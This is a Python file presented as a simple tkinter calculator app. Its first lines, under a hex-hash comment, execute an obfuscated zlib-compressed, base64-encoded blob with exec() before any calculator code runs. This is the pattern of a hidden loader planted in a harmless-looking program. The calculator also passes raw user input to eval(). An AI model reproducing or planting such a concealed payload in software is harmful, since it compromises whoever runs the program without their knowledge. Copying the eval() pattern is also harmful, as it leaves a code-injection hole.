# d93b466476d8c96e8d5a887d6c8f3099
exec("import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b'eNqNV0tv20YQvutXEMwhUmrR3PeugZyKFuilBYre4oKgxJXERiaF5Sq2W-S_d_bBlyUZEWBLWs7MzuObb0YfEqwY4mLxIflT77TRzVY_JAdrT93D_b096NOrPbTNtjWNNtm2fbo_tZ3t7nGO0TqXa5KvD-3z2rbrrdGl1etvtTl366B1vwCzihGiGHz42dQn2-5NuatL_yDHRJBF_XRqjU3azp1RjBBR_dn-2G7cKRMEIdyfHsrucKz9A0kFYoP4v_0pIpzL_nRTdppTdw6msRT9uSmbqn1y55gohMnC-6QoBuFK7xIIpyp29VEXx7rR3dJ_PJX2sHrwnuZEEb5I4FWVtkw-J7-3jfY2uJDMP3iu7SFpT7oZle-S1KSrpOwSd_QQ3RUs9woTa-5x5nwIt6-cJJESRUmj7dk0XjjkDStJfQhICCmkD6HddNuz0YWvSbFtK70cP4YwoDZ5sAi1PRnddcVRf9NH8ED551ARzoYwi82r1R089O_LNM3-aetmahUCPNvdWqbeY8ogTTOPQzmyszl25U4XG04Bcs4zV72sd2I5Xnb3xrOVNywoQjzUDNLHGfcBWyhqt2vN03shI8URpuDTIK2riTwE9-XvgAVFmAA5EElcFZK6SUa5kD6s8gCC68ay8gTlr5bphyRNfko6a5YBd5l7g7-9XqLcv1YrEEgfm5A4RnIeC_O-Ze_YRBHgy6hTjPm-ru1TiBjlyKeQCMk59inca1vYcn-BdyQFVdI75J805ZNLVdtlTiZzZXVHEzWvBewSotjofd0UrnededCMbZw9VWy5HE1CKPdeNl1lERk9oFbZQb9U9V53NvYDp1JRbx5S8YPGQfIHTCOeIzlxPJiNZZzH4rEiMcNi8GQmPXUtYIZCvqc98WW85G7Q9xgkkPaAckG4YmxkpgnAQ4EURjn2Vq9gmWPKWLizbrq60nPA_1oeO48JzhWnwcp1p0B4QEgR6LHwCQMKhX50ioH0FQNsua-ev0DtLZ_OtTniSAV0TbrNSz5EjhZMDCRZ75LlWJgoCbTaVMmyae1lkBHEWCnMByu30vGXOQcmV7miZBDXR7i2z0S8M6aeMsxmZjcQ7ld_JeMKT210USeniucznevNHehOEADYFDPzXlZCuNEWSs1yhDxQdnUTUt4toSOtNs1dYtrWFlVtQkIwUjimNdp1Mzdz_y5VPg-6nqGUlHIRagME7C-sm53e2um0826Gu4CWJGEjgwRhXU3xJ3LIJflB_M2phomcwuoQRiCwDprO5tvD3AdAqYzdMUWf0w0TmlNI8BR8F9gLcsCinM5q-jbSCbQkU9chw3LOgTW9Z4z1gIVbHbJnBv2tQkm3YPVmri8dz2Hp2B512RTD6qEoDGgx82KUyJ5NbfWkzSZTRpCc4jl6b07T20M51A0IB819iHvLGztXtpnrd65ifzExb3X9ordnW26Ozlrqvi0f08nu-PjYzHZG-O6F_GZS6WE3uVxh3EM3TeKIv-K_H-6r1eoxXaUxkR4xDF70_QKMboeViioawXpbJbbLpGIKSyzyd9VCazjUh-mKYKLQyCkc-DcOn9Ox3sKmH8cOoq47xrnTN9t0Pnm3uSI5GXpswKZroAlPpZ-y02sKgM3SuKBSgjkee-8Gw3hRxhCKfQMrOA1LsIvSeOtvVxrMkEI07livcTeEMc7f76WPzx_nCzxXsMKJi7bPrDk3PlN5yADsWzJEol-2-mST3_74xZjWPPQchMayBjYO1E-RjFHBMqCUjyqAwrn0emzLKhYDTAwRvdgiMrhD-6cMDgLkYGUlg4jPuiPVgfYnit5tzhQhk8XPJcFpDNqB-XJgoWH8S9hV-K1a9zZCeXMIaWyAq8UKXlOC-n0fOJEuJkAMEzCnYnGRlpA22BPpwrniIiyPxbfS1K6hwlboKRwWv_AQfmtlX_UrvMWxJXMm1JSCrxnJOlsa2znALNOiiOClRAo2gtezSVrBr6v_vqeZ462yv3VuLfzGASRCyE78msxi8T9iBWsL')))")
# 24c1e852ac430249951077d3d9acf367
import tkinter as tk

def calculate():
    try:
        result = eval(entry.get())
        output.config(text="Result: " + str(result))
    except:
        output.config(text="Invalid input!")

# Function to insert numbers
def insert_number(number):
    entry.insert(tk.END, number)

# Create the main window
window = tk.Tk()
window.title("Calculator")

# Create an entry widget for user input
entry = tk.Entry(window, width=20)
entry.pack()

# Create a button to trigger calculation
calculate_button = tk.Button(window, text="Calculate", command=calculate)
calculate_button.pack()

# Create number buttons
buttons_frame = tk.Frame(window)
buttons_frame.pack()

numbers = ["7", "8", "9", "4", "5", "6", "1", "2", "3", "0"]

for number in numbers:
    button = tk.Button(buttons_frame, text=number, command=lambda num=number: insert_number(num))
    button.pack(side=tk.LEFT)

# Create buttons for additional operations
add_button = tk.Button(buttons_frame, text="+", command=lambda: entry.insert(tk.END, "+"))
add_button.pack(side=tk.LEFT)

subtract_button = tk.Button(buttons_frame, text="-", command=lambda: entry.insert(tk.END, "-"))
subtract_button.pack(side=tk.LEFT)

multiply_button = tk.Button(buttons_frame, text="*", command=lambda: entry.insert(tk.END, "*"))
multiply_button.pack(side=tk.LEFT)

divide_button = tk.Button(buttons_frame, text="/", command=lambda: entry.insert(tk.END, "/"))
divide_button.pack(side=tk.LEFT)

# Create a label to display the result
output = tk.Label(window, text="Result: ")
output.pack()

# Start the main event loop
window.mainloop()
